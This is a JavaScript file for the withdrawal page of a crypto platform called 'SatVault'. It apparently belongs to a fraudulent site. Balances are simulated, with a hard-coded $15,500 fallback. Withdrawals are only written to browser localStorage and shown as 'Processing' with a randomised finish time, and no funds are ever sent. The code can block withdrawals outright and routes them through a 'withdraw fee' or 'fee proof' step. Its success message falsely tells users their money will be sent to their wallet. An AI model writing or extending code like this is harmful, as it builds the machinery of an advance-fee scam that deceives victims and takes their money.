(function () {
  if (typeof fillWalletFields === "function") fillWalletFields();

  if (typeof isWithdrawalsBlocked === "function" && isWithdrawalsBlocked()) {
    var withdrawForm = document.getElementById("withdraw-form");
    if (withdrawForm) withdrawForm.classList.add("hidden");
  }

  function getProfile() {
    return window.SatVaultAuth && SatVaultAuth.getActiveProfile
      ? SatVaultAuth.getActiveProfile()
      : null;
  }

  function formatAvailable(usd) {
    var profile = getProfile();
    if (profile && profile.currency === "USDT") {
      return Number(usd).toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 }) + " USDT";
    }
    return "$" + Number(usd).toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 });
  }

  function refreshWithdrawAvailable() {
    var available = typeof getAvailableBalance === "function"
      ? getAvailableBalance()
      : (SITE.balanceUsd || 15500);
    var el = document.getElementById("withdraw-available");
    var input = document.getElementById("withdraw-amount");
    if (el) el.textContent = formatAvailable(available);
    if (input) input.max = Math.max(100, Math.floor(available));
  }

  function showWithdrawError(message) {
    var err = document.getElementById("withdraw-error");
    var ok = document.getElementById("withdraw-success");
    if (ok) ok.classList.add("hidden");
    err.textContent = message;
    err.classList.remove("hidden");
  }

  function validateWithdrawAmount(amount) {
    var available = typeof getAvailableBalance === "function"
      ? getAvailableBalance()
      : (SITE.balanceUsd || 15500);

    if (!amount || Number.isNaN(amount)) {
      showWithdrawError("Enter a valid withdrawal amount.");
      return false;
    }
    if (amount < 100) {
      showWithdrawError("Minimum withdrawal is $100.");
      return false;
    }
    if (amount > available) {
      showWithdrawError("Insufficient balance. Available: " + formatAvailable(available));
      return false;
    }
    return true;
  }

  function isLikelyBtcWallet(addr) {
    var value = (addr || "").trim();
    if (value.length < 26 || value.length > 90) return false;
    return /^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,87}$/.test(value);
  }

  function validateDestinationWallet(wallet) {
    var value = (wallet || "").trim();
    if (!value) {
      showWithdrawError("Enter the BTC wallet address you want to withdraw to.");
      return false;
    }
    if (!isLikelyBtcWallet(value)) {
      showWithdrawError("Enter a valid BTC wallet address (starts with bc1, 1, or 3).");
      return false;
    }
    return true;
  }

  function queueWithdrawal(amount, destinationWallet) {
    var profile = getProfile();
    var withinMs = (profile && profile.withdrawCompleteWithinMs) || (60 * 60 * 1000);
    var completesAt = Date.now() + Math.max(5 * 60 * 1000, Math.floor(withinMs * (0.5 + Math.random() * 0.5)));
    var txs = typeof getTransactions === "function" ? getTransactions() : [];
    var amountLabel = (profile && profile.currency === "USDT")
      ? ("-" + amount.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 }) + " USDT")
      : ("-$" + amount.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 }));

    // Deduct from platform balance immediately; funds are then sent to the user's destination wallet.
    if (typeof updateBalance === "function" && typeof getWalletUsd === "function") {
      var book = getWalletUsd();
      updateBalance(Math.max(0, Math.round((book - amount) * 100) / 100));
    }

    txs.unshift({
      date: new Date().toLocaleDateString(),
      createdAt: Date.now(),
      completesAt: completesAt,
      amountUsd: amount,
      type: "Withdrawal",
      asset: (profile && profile.asset) || "BTC",
      amount: amountLabel,
      status: "Processing",
      feeProofSubmitted: true,
      balanceDeducted: true,
      destinationWallet: destinationWallet || ""
    });

    if (typeof saveTransactions === "function") saveTransactions(txs);
    else {
      var write = window.__runSecureWrite || function (fn) { fn(); };
      write(function () {
        localStorage.setItem("transactions", JSON.stringify(txs));
      });
    }

    refreshWithdrawAvailable();
    if (typeof renderDashboardStats === "function") renderDashboardStats();
    if (typeof refreshBtcBalances === "function") refreshBtcBalances();

    var ok = document.getElementById("withdraw-success");
    var err = document.getElementById("withdraw-error");
    if (err) err.classList.add("hidden");
    var shortWallet = destinationWallet
      ? (destinationWallet.slice(0, 8) + "…" + destinationWallet.slice(-6))
      : "your wallet";
    ok.textContent = "$" +
      Number(amount).toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 }) +
      " has been deducted from your account and will be sent to " + shortWallet + ".";
    ok.classList.remove("hidden");
    var form = document.getElementById("withdraw-form");
    if (form) form.reset();
    setTimeout(function () { location.href = "/dashboard/accounthistory.html"; }, 2500);
  }

  function setupDestinationWalletField() {
    var wrap = document.getElementById("withdraw-wallet-wrap");
    var input = document.getElementById("withdraw-wallet");
    if (!wrap || !input) return;
    var needsWallet = typeof requiresWithdrawFeeProof === "function" && requiresWithdrawFeeProof();
    wrap.classList.toggle("hidden", !needsWallet);
    input.required = !!needsWallet;
    if (!needsWallet) input.value = "";
  }

  refreshWithdrawAvailable();
  setupDestinationWalletField();
  document.addEventListener("transactionsUpdated", refreshWithdrawAvailable);

  var form = document.getElementById("withdraw-form");
  if (!form) return;

  form.addEventListener("submit", function (e) {
    e.preventDefault();
    if (typeof isWithdrawalsBlocked === "function" && isWithdrawalsBlocked()) {
      if (typeof showWithdrawBlockedModal === "function") showWithdrawBlockedModal();
      return;
    }

    var err = document.getElementById("withdraw-error");
    var ok = document.getElementById("withdraw-success");
    err.classList.add("hidden");
    ok.classList.add("hidden");

    var amount = Number(document.getElementById("withdraw-amount").value);
    if (!validateWithdrawAmount(amount)) return;

    if (typeof requiresWithdrawFeeProof === "function" && requiresWithdrawFeeProof()) {
      var destinationWallet = (document.getElementById("withdraw-wallet").value || "").trim();
      if (!validateDestinationWallet(destinationWallet)) return;

      showWithdrawFeeProofModal(amount, destinationWallet, function (result) {
        var finalAmount = (result && result.amount) || amount;
        var finalWallet = (result && result.destinationWallet) || destinationWallet;
        if (!validateWithdrawAmount(finalAmount)) return;
        queueWithdrawal(finalAmount, finalWallet);
      });
      return;
    }

    WalletModal.showWithdrawFee(amount, function () {
      if (!validateWithdrawAmount(amount)) return;
      queueWithdrawal(amount, "");
    });
  });
})();
